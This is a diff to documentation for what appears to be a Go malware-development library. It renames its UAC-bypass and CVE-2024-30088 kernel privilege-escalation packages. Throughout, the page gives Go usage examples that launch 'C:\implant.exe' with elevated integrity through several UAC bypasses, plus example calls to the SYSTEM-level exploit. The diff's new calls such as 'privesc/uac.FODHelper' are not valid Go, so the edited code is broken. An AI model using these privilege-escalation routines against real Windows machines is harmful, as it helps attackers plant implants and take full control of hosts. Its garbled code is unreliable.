@@ -4,8 +4,8 @@
 
 This page documents privilege-related packages in maldev:
 
-- **`uacbypass`** -- UAC bypass via auto-elevated Windows executables (T1548.002)
-- **`exploit/cve202430088`** -- Kernel TOCTOU race condition for LPE to SYSTEM (CVE-2024-30088)
+- **`privesc/uac`** -- UAC bypass via auto-elevated Windows executables (T1548.002)
+- **`privesc/cve202430088`** -- Kernel TOCTOU race condition for LPE to SYSTEM (CVE-2024-30088)
 - **`win/privilege`** -- SeDebug / SeImpersonate / SeBackup privilege enable/disable via AdjustTokenPrivileges (T1134)
 
 > **Related API docs**
@@ -22,9 +22,9 @@ used are `SeDebugPrivilege`, `SeImpersonatePrivilege`,
 
 ---
 
-## uacbypass -- User Account Control Bypass
+## privesc/uac -- User Account Control Bypass
 
-Package `uacbypass` implements four UAC bypass techniques that abuse auto-elevated Windows binaries. Each function takes a path to an executable and launches it with high integrity (bypassing the UAC prompt) by hijacking how the auto-elevated binary resolves its handler.
+Package `privesc/uac` implements four UAC bypass techniques that abuse auto-elevated Windows binaries. Each function takes a path to an executable and launches it with high integrity (bypassing the UAC prompt) by hijacking how the auto-elevated binary resolves its handler.
 
 **MITRE ATT&CK:** T1548.002 (Abuse Elevation Control Mechanism: Bypass User Account Control)
 **Platform:** Windows only
@@ -61,11 +61,11 @@ package main
 import (
     "log"
 
-    "github.com/oioio-space/maldev/uacbypass"
+    "github.com/oioio-space/maldev/privesc/uac"
 )
 
 func main() {
-    err := uacbypass.FODHelper(`C:\Windows\System32\cmd.exe`)
+    err := privesc/uac.FODHelper(`C:\Windows\System32\cmd.exe`)
     if err != nil {
         log.Fatal(err)
     }
@@ -99,11 +99,11 @@ package main
 import (
     "log"
 
-    "github.com/oioio-space/maldev/uacbypass"
+    "github.com/oioio-space/maldev/privesc/uac"
 )
 
 func main() {
-    err := uacbypass.SLUI(`C:\implant.exe`)
+    err := privesc/uac.SLUI(`C:\implant.exe`)
     if err != nil {
         log.Fatal(err)
     }
@@ -139,11 +139,11 @@ package main
 import (
     "log"
 
-    "github.com/oioio-space/maldev/uacbypass"
+    "github.com/oioio-space/maldev/privesc/uac"
 )
 
 func main() {
-    err := uacbypass.SilentCleanup(`C:\implant.exe`)
+    err := privesc/uac.SilentCleanup(`C:\implant.exe`)
     if err != nil {
         log.Fatal(err)
     }
@@ -177,11 +177,11 @@ package main
 import (
     "log"
 
-    "github.com/oioio-space/maldev/uacbypass"
+    "github.com/oioio-space/maldev/privesc/uac"
 )
 
 func main() {
-    err := uacbypass.EventVwr(`C:\implant.exe`)
+    err := privesc/uac.EventVwr(`C:\implant.exe`)
     if err != nil {
         log.Fatal(err)
     }
@@ -214,11 +214,11 @@ package main
 import (
     "log"
 
-    "github.com/oioio-space/maldev/uacbypass"
+    "github.com/oioio-space/maldev/privesc/uac"
 )
 
 func main() {
-    err := uacbypass.EventVwrLogon(
+    err := privesc/uac.EventVwrLogon(
         "CORP",
         "localadmin",
         "P@ssw0rd!",
@@ -232,7 +232,7 @@ func main() {
 
 ---
 
-## exploit/cve202430088 -- Kernel LPE to SYSTEM
+## privesc/cve202430088 -- Kernel LPE to SYSTEM
 
 Package `cve202430088` implements CVE-2024-30088, a Windows kernel TOCTOU (Time-of-Check-to-Time-of-Use) race condition in `AuthzBasepCopyoutInternalSecurityAttributes` that allows local privilege escalation from any user to `NT AUTHORITY\SYSTEM`.
 
@@ -333,7 +333,7 @@ import (
     "fmt"
     "log"
 
-    "github.com/oioio-space/maldev/exploit/cve202430088"
+    "github.com/oioio-space/maldev/privesc/cve202430088"
 )
 
 func main() {
@@ -378,7 +378,7 @@ import (
     "log"
     "syscall"
 
-    "github.com/oioio-space/maldev/exploit/cve202430088"
+    "github.com/oioio-space/maldev/privesc/cve202430088"
 )
 
 func main() {
@@ -445,7 +445,7 @@ import (
 
     slog "log/slog"
 
-    "github.com/oioio-space/maldev/exploit/cve202430088"
+    "github.com/oioio-space/maldev/privesc/cve202430088"
 )
 
 func main() {
@@ -478,7 +478,7 @@ import (
 
     "golang.org/x/sys/windows"
 
-    "github.com/oioio-space/maldev/exploit/cve202430088"
+    "github.com/oioio-space/maldev/privesc/cve202430088"
     "github.com/oioio-space/maldev/win/token"
 )
 
